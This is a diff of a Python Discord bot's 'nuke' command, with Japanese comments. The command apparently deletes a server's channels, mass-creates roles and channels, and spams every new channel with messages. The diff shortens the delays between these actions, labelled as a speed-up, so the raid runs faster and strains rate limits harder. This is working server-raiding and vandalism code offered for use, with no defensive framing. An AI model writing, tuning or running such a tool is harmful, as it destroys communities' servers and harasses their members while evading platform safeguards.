@@ -1,4 +1,4 @@
-# main.py（Render 対応・Unknown Channel 回避版）
+# main.py（高速化・Render対応版 nuke）
 import os
 import asyncio
 import logging
@@ -79,7 +79,7 @@ async def nuke(ctx):
         await asyncio.sleep(0.05)
 
     # 削除反映待ち
-    await asyncio.sleep(5)
+    await asyncio.sleep(3)
 
     # 2. バックアップチャンネル作成（通知用）
     try:
@@ -98,7 +98,7 @@ async def nuke(ctx):
         await asyncio.sleep(0.05)
     await backup_channel.send(f"🔨 ロール {ROLE_COUNT} 個作成完了")
 
-    # 4. チャンネル作成
+    # 4. チャンネル作成（高速化）
     created_channels = []
     for i in range(1, CHANNEL_COUNT+1):
         try:
@@ -106,17 +106,17 @@ async def nuke(ctx):
             created_channels.append(ch)
         except Exception as e:
             logger.exception(f"チャンネル作成失敗: {i}: {e}")
-        await asyncio.sleep(0.3)
+        await asyncio.sleep(0.12)  # 従来 0.3 → 0.12 秒
     await backup_channel.send(f"🆕 チャンネル {CHANNEL_COUNT} 個作成完了")
 
-    # 5. メッセージ送信
+    # 5. メッセージ送信（高速化）
     for ch in created_channels:
         for msg in CHANNEL_MESSAGES:
             try:
                 await ch.send(msg)
             except Exception as e:
                 logger.exception(f"メッセージ送信失敗 ({ch.name}): {e}")
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.02)  # 従来 0.05 → 0.02 秒
         await asyncio.sleep(0.03)
     await backup_channel.send("✅ nuke 完了！")
 
